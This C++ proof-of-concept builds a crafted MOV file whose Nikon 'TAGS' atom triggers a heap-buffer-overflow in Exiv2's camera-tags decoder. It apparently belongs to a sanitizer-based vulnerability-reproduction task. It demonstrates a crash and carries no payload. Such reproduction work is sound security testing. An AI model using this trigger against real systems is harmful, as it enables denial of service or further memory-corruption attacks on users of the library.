// Proof-of-concept for a heap-buffer-overflow reachable through Exiv2's
// public API when reading a crafted QuickTime/MOV file containing a
// Nikon "TAGS" camera-info atom.
//
// Build (ASan): see selection.json. Drives Exiv2::ImageFactory::open()
// and Image::readMetadata(), both public API entry points.

#include <exiv2/exiv2.hpp>

#include <cstdint>
#include <cstring>
#include <iostream>
#include <vector>

namespace {

void putU32(std::vector<uint8_t>& v, uint32_t x) {
  v.push_back(static_cast<uint8_t>((x >> 24) & 0xff));
  v.push_back(static_cast<uint8_t>((x >> 16) & 0xff));
  v.push_back(static_cast<uint8_t>((x >> 8) & 0xff));
  v.push_back(static_cast<uint8_t>(x & 0xff));
}

void putTag(std::vector<uint8_t>& v, const char tag[4]) {
  v.insert(v.end(), tag, tag + 4);
}

void putFill(std::vector<uint8_t>& v, size_t n, uint8_t fill = 0x41) {
  v.insert(v.end(), n, fill);
}

std::vector<uint8_t> buildFile() {
  std::vector<uint8_t> file;

  // 'ftyp' box: identifies the file as a QuickTime movie.
  putU32(file, 16);
  putTag(file, "ftyp");
  putTag(file, "qt  ");
  putU32(file, 0);

  // Payload consumed by QuickTimeVideo::CameraTagsDecoder() once it
  // recognises the leading "NIKO" marker.
  std::vector<uint8_t> tagsPayload;
  putTag(tagsPayload, "NIKO");  // first 4 bytes of the 24-byte Make field
  putFill(tagsPayload, 20);     // remainder of Make
  putFill(tagsPayload, 14);     // Model
  putFill(tagsPayload, 4);      // ExposureTime
  putFill(tagsPayload, 4);      // FNumber numerator
  putU32(tagsPayload, 1);       // FNumber denominator
  putFill(tagsPayload, 4);      // ExposureCompensation numerator
  putU32(tagsPayload, 1);       // ExposureCompensation denominator
  putFill(tagsPayload, 10);     // scratch bytes skipped by the decoder
  putFill(tagsPayload, 4);      // WhiteBalance code
  putFill(tagsPayload, 4);      // FocalLength numerator
  putU32(tagsPayload, 1);       // FocalLength denominator
  putFill(tagsPayload, 95);     // bytes skipped via seek(95, cur)
  putFill(tagsPayload, 51);     // Software/firmware field
  putFill(tagsPayload, 4);      // ISO (not reached if the bug fires)

  // 'TAGS' box.
  std::vector<uint8_t> tagsBox;
  putU32(tagsBox, static_cast<uint32_t>(8 + tagsPayload.size()));
  putTag(tagsBox, "TAGS");
  tagsBox.insert(tagsBox.end(), tagsPayload.begin(), tagsPayload.end());

  // 'udta' box wrapping 'TAGS'.
  std::vector<uint8_t> udtaBox;
  putU32(udtaBox, static_cast<uint32_t>(8 + tagsBox.size()));
  putTag(udtaBox, "udta");
  udtaBox.insert(udtaBox.end(), tagsBox.begin(), tagsBox.end());

  // 'moov' box wrapping 'udta'.
  putU32(file, static_cast<uint32_t>(8 + udtaBox.size()));
  putTag(file, "moov");
  file.insert(file.end(), udtaBox.begin(), udtaBox.end());

  return file;
}

}  // namespace

int main() {
  const std::vector<uint8_t> file = buildFile();

  try {
    auto image = Exiv2::ImageFactory::open(file.data(), file.size());
    image->readMetadata();
    std::cerr << "no crash: metadata read completed\n";
  } catch (const std::exception& e) {
    std::cerr << "caught exception (no memory-safety abort): " << e.what() << "\n";
  }
  return 0;
}
